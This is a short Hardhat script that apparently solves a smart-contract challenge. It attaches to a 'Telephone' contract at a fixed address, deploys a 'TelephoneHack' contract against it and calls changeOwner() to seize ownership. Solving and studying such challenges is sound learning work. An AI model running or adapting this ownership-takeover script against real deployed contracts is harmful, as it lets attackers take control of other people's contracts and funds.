// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {

    const Telephone = await hre.ethers.getContractFactory("Telephone");
    const TelephoneHack = await hre.ethers.getContractFactory("TelephoneHack");

    const telephone = Telephone.attach('0xF270b7765006De20d39246587d8F0fbAb0B887aF');
    console.log(`Telephone owner is ${await telephone.owner()}`);

    const telephoneHack = await TelephoneHack.deploy('0xF270b7765006De20d39246587d8F0fbAb0B887aF');
    await telephoneHack.deployed();

    const tx = await telephoneHack.changeOwner();
    console.log(tx);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
